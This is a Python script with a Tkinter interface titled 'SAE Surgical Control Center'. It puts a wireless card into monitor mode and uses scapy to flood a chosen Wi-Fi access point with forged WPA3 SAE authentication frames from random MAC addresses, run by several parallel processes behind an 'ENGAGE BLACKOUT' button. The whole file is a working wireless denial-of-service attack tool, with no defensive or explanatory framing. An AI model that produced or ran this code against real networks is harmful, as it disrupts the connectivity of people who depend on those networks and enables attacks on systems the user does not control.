import os, sys, time, multiprocessing, random, subprocess
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class SAEControlCenter:
    def __init__(self, iface):
        self.iface = iface
        self.running = True
        self.flooding = False
        self.processes = []
        
        self.prep_hardware()
        self.build_gui()

    def prep_hardware(self):
        os.system("sudo iw reg set PH")
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def build_gui(self):
        self.root = tk.Tk()
        self.root.title("SAE Surgical Control Center v11.0")
        self.root.geometry("600x450")
        self.root.configure(bg="#050505")

        # Target Inputs
        tk.Label(self.root, text="BSSID (Target):", fg="#00FF41", bg="#050505").pack(pady=5)
        self.target_ent = tk.Entry(self.root, bg="#111", fg="white")
        self.target_ent.pack()

        # HANDSHAKE LEVEL SLIDER
        tk.Label(self.root, text="HANDSHAKE LEVEL (Seq Num):", fg="#00FF41", bg="#050505").pack(pady=10)
        self.level_slider = tk.Scale(self.root, from_=1, to=5, orient="horizontal", bg="#050505", fg="white", highlightthickness=0)
        self.level_slider.set(1) # Default to Commit phase
        self.level_slider.pack(fill="x", padx=50)

        # NITRO ENGINES (Process Count)
        tk.Label(self.root, text="NITRO ENGINES (Parallel Procs):", fg="#00FF41", bg="#050505").pack(pady=10)
        self.proc_slider = tk.Scale(self.root, from_=1, to=multiprocessing.cpu_count(), orient="horizontal", bg="#050505", fg="white", highlightthickness=0)
        self.proc_slider.set(2)
        self.proc_slider.pack(fill="x", padx=50)

        self.btn = tk.Button(self.root, text="ENGAGE BLACKOUT", bg="#aa0000", fg="white", height=2, command=self.toggle_flood)
        self.btn.pack(pady=20)
        
        tk.Button(self.root, text="REPAIR & EXIT", bg="#333", fg="white", command=self.shutdown).pack()

    def engine_logic(self, bssid, level):
        conf.verb = 0
        s = conf.L2socket(iface=self.iface)
        base_pkt = (RadioTap() / 
                    Dot11(addr1=bssid, addr3=bssid) / 
                    Dot11Auth(algo=3, seqnum=level, status=0) / 
                    Dot11Elt(ID=19, info=b"\x13\x00") / 
                    Raw(load=b"\x00"*32))
        
        while True:
            base_pkt.addr2 = RandMAC()
            s.send(base_pkt)

    def toggle_flood(self):
        if not self.flooding:
            bssid = self.target_ent.get()
            if ":" not in bssid: return
            
            level = self.level_slider.get()
            count = self.proc_slider.get()
            
            self.flooding = True
            self.btn.config(text="STOPPING...", state="disabled")
            
            for _ in range(count):
                p = multiprocessing.Process(target=self.engine_logic, args=(bssid, level))
                p.start()
                self.processes.append(p)
            
            self.btn.config(text="HALT BLACKOUT", state="normal", bg="#555")
        else:
            self.flooding = False
            for p in self.processes: p.terminate()
            self.processes = []
            self.btn.config(text="ENGAGE BLACKOUT", bg="#aa0000")

    def shutdown(self):
        self.flooding = False
        for p in self.processes: p.terminate()
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    SAEControlCenter(sys.argv[1]).root.mainloop()
